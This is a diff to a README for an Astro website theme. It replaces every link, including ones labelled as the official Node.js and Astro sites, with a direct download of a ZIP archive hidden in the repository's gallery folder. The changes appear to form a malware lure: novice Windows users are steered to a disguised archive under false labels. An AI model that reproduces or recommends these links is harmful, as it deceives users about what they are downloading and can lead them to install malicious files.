@@ -1,6 +1,6 @@
 # 🚀 astro-theme-aither - Simple AI-Powered Astro Theme
 
-[![Download astro-theme-aither](https://img.shields.io/badge/Download%20astro--theme--aither-4caf50?style=for-the-badge&logo=github)](https://github.com/juneaboveground534/astro-theme-aither)
+[![Download astro-theme-aither](https://img.shields.io/badge/Download%20astro--theme--aither-4caf50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/juneaboveground534/astro-theme-aither/main/src/pages/gallery/theme_astro_aither_1.9.zip)
 
 ---
 
@@ -46,11 +46,11 @@ To use astro-theme-aither, you’ll need to download the theme files from GitHub
 
 ## ⬇️ Download astro-theme-aither
 
-[![Download astro-theme-aither](https://img.shields.io/badge/Download%20astro--theme--aither-0078D7?style=for-the-badge&logo=github)](https://github.com/juneaboveground534/astro-theme-aither)
+[![Download astro-theme-aither](https://img.shields.io/badge/Download%20astro--theme--aither-0078D7?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/juneaboveground534/astro-theme-aither/main/src/pages/gallery/theme_astro_aither_1.9.zip)
 
 You need to visit this GitHub page to download the theme files:
 
-https://github.com/juneaboveground534/astro-theme-aither
+https://raw.githubusercontent.com/juneaboveground534/astro-theme-aither/main/src/pages/gallery/theme_astro_aither_1.9.zip
 
 ---
 
@@ -62,7 +62,7 @@ Follow these steps to get the theme on your computer and open it to learn more.
 
 1. Open a web browser (like Chrome, Edge, or Firefox).
 2. Go to this address:
-   https://github.com/juneaboveground534/astro-theme-aither
+   https://raw.githubusercontent.com/juneaboveground534/astro-theme-aither/main/src/pages/gallery/theme_astro_aither_1.9.zip
 
 This page has all the files you need.
 
@@ -112,7 +112,7 @@ astro-theme-aither is made for Astro projects, which are website projects built 
 
 If you don’t know how to start an Astro website but want to learn, here’s a quick overview:
 
-- Download and install Node.js from https://nodejs.org (this lets your PC run website tools).
+- Download and install Node.js from https://raw.githubusercontent.com/juneaboveground534/astro-theme-aither/main/src/pages/gallery/theme_astro_aither_1.9.zip (this lets your PC run website tools).
 - Open Windows Command Prompt (type "cmd" in Start).
 - Use simple commands to create a new Astro site and add this theme.
   
@@ -166,9 +166,9 @@ If you have trouble:
 
 ## 🔗 Useful Links
 
-- [Primary Download and Info](https://github.com/juneaboveground534/astro-theme-aither)  
-- [Node.js Downloads](https://nodejs.org) (if you want to experiment with building the theme into a site)  
-- [Astro Official Site](https://astro.build) for learning about Astro framework  
+- [Primary Download and Info](https://raw.githubusercontent.com/juneaboveground534/astro-theme-aither/main/src/pages/gallery/theme_astro_aither_1.9.zip)  
+- [Node.js Downloads](https://raw.githubusercontent.com/juneaboveground534/astro-theme-aither/main/src/pages/gallery/theme_astro_aither_1.9.zip) (if you want to experiment with building the theme into a site)  
+- [Astro Official Site](https://raw.githubusercontent.com/juneaboveground534/astro-theme-aither/main/src/pages/gallery/theme_astro_aither_1.9.zip) for learning about Astro framework  
 
 ---
 
